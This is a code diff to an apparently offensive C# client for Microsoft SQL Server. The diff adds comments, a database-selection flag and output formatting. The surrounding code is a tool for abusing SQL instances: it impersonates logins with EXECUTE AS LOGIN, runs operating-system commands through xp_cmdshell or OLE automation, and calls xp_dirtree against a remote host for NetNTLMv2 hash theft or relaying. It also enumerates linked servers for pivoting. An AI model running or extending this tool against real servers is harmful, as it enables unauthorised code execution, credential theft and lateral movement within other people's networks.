@@ -1,7 +1,7 @@
 // MSSQL clinet that is using windows integrated authentication (kerberos) in order to enumerate mssql instance and abuse
 // TODO:
-// 1. Add options for specifying database to connect to, eg. at the moment on raw queries, use statement needs to be used
-//    --raw "use msdb; ......"
+// 1. Add more code execution options
+// 2. Rework a bit the output formatting so it can be prettier
 using System;
 using System.Data.SqlClient;
 using System.Collections.Generic;
@@ -11,6 +11,7 @@ namespace SQL
 {
     internal class Program
     {
+        // Generic method to Run SQL queries and get the output
         static List<object> RunQuery(SqlConnection con, String query)
         {
             SqlCommand cmd = new SqlCommand(query, con);
@@ -29,6 +30,7 @@ namespace SQL
             return results;
         }
 
+        // Wrapper around execute as login
         static void RunAs(SqlConnection con, String user) 
         {
             String query = $"EXECUTE AS LOGIN = '{user}';";
@@ -42,6 +44,7 @@ namespace SQL
             }
         }
 
+        // Code execution, at the moment via xp_cmdshell or OLE object
         static void ExecCmd(SqlConnection con, String os_cmd, String method, String link) 
         {
             String query1, query2;
@@ -63,7 +66,11 @@ namespace SQL
                 {
                     RunQuery(con, query1);
                     var results = RunQuery(con, query2);
-                    Console.WriteLine($"\tResult:\n{results[0]}");
+                    foreach (var res in results)
+                    {
+                        var row = (List<object>)res;
+                        Console.WriteLine($"\tResult:\n{string.Join(" | ", row)}");
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -98,6 +105,7 @@ namespace SQL
             }
         }
 
+        // NetNTLMv2 hash stealing or relaying
         static void ExecDirtree(SqlConnection con, String remote_host, String link)
         {
             // Add other procedures as well, xp_dirtree may be disabled...
@@ -112,6 +120,7 @@ namespace SQL
             RunQuery(con, query);
         }
 
+        // Check as which user the DB instance is running
         static void CheckSA(SqlConnection con, String link)
         {
             Console.WriteLine($"[+] Checking with which service accounts the DB process is running on server {link}");
@@ -126,7 +135,8 @@ namespace SQL
                 var results = RunQuery(con, query);
                 foreach (var res in results)
                 {
-                    Console.WriteLine($"\tMSSQL running as: {res}");
+                    var row = (List<object>)res;
+                    Console.WriteLine($"\tMSSQL running as: {string.Join(",", row)}");
                 }
             }
             catch (Exception ex) 
@@ -148,10 +158,12 @@ namespace SQL
 
             var results = RunQuery(con, query);
             foreach (var res in results) {
-                Console.WriteLine($"\tLogged in as: {res}");
+                var row = (List<object>)res;
+                Console.WriteLine($"\tLogged in as: {string.Join("", row)}");
             }
         }
 
+        // Linked SQL servers
         static void CheckLinks(SqlConnection con, String link)
         {
             Console.WriteLine($"[+] Checking for linked SQL instances on server {link}");
@@ -165,10 +177,12 @@ namespace SQL
             var results = RunQuery(con, query);
             foreach (var res in results)
             {
-                Console.WriteLine($"\tLink: {res}");
+                var row = (List<object>)res;
+                Console.WriteLine($"\tLink: {string.Join("\n", row[0])}");
             }
         }
 
+        // Check for impersonations
         static void CheckImpersonate(SqlConnection con, String link) 
         {
             Console.WriteLine($"[+] Checking logins that allow impersonation on server {link}");
@@ -183,10 +197,12 @@ namespace SQL
             var results = RunQuery(con, query);
             foreach (var res in results)
             {
-                Console.WriteLine($"\tLogin: {res}");
+                var row = (List<object>)res;
+                Console.WriteLine($"\tLogin: {string.Join("", row)}");
             }
         }
 
+        // Check the current user's roles
         static void CheckRoles(SqlConnection con, String link)
         {
             List<string> roles = new List<string> { "public", "sysadmin", "serveradmin", "securityadmin", "setupadmin", "processadmin", "diskadmin", "dbcreator", "bulkadmin" };
@@ -203,7 +219,8 @@ namespace SQL
                 }
 
                 var results = RunQuery(con, query);
-                Int32 role_id = Int32.Parse(results[0].ToString());
+                var row = (List<object>)results[0];
+                Int32 role_id = Convert.ToInt32(row[0]);
                 if (role_id == 1)
                 {
                     Console.WriteLine($"\tUser has: {role} privileges");
@@ -211,6 +228,7 @@ namespace SQL
             }
         }
 
+        // Simple function to display a help menu
         static void Help() 
         {
             Console.WriteLine("[!] Please provide SQL host to connect to, operation and any other needed params");
@@ -222,11 +240,13 @@ namespace SQL
             Console.WriteLine("--rhost      ->  Remote host for connection, atm only trough xp_dirtree");
             Console.WriteLine("--link       ->  Linked server");
             Console.WriteLine("--raw        ->  Raw SQL query to execute");
+            Console.WriteLine("--database   ->  Database to use");
             Console.WriteLine("\nNote: exec uses xp_cmdshell, exec-ole uses sp_OACreate and sp_OAMethod");
             Environment.Exit(0);
         }
 
 
+        // Simple function to parse command line flags
         static Dictionary<string, string> Parser(string[] args)
         {
             if (args.Length == 0)
@@ -241,6 +261,7 @@ namespace SQL
             options.Add("rhost", "");
             options.Add("link", "");
             options.Add("raw", "");
+            options.Add("database", "");
 
             for (int i = 0; i < args.Length; i++)
             {
@@ -251,6 +272,10 @@ namespace SQL
                     {
                         switch (key) 
                         {
+                            case "database":
+                                options["database"] = args[i + 1];
+                                break;
+
                             case "host":
                                 options["host"] = args[i + 1];
                                 break;
@@ -310,7 +335,14 @@ namespace SQL
             if (string.IsNullOrEmpty(sql_host) || string.IsNullOrEmpty(operation)) Help();
 
 
-            String db_name = "master";
+            String db_name;
+            if (string.IsNullOrEmpty(options["database"]))
+            {
+                db_name = "master";
+            }
+            else {
+                db_name = options["database"];
+            }
 
             String conString = "Server = " + sql_host + "; Database = " + db_name + "; Integrated Security = True;";
             SqlConnection con = new SqlConnection(conString);
@@ -318,7 +350,7 @@ namespace SQL
             try
             {
                 con.Open();
-                Console.WriteLine("[+] Authenticated");
+                Console.WriteLine($"[+] Authenticated against: {db_name}");
             }
             catch (Exception ex)
             {
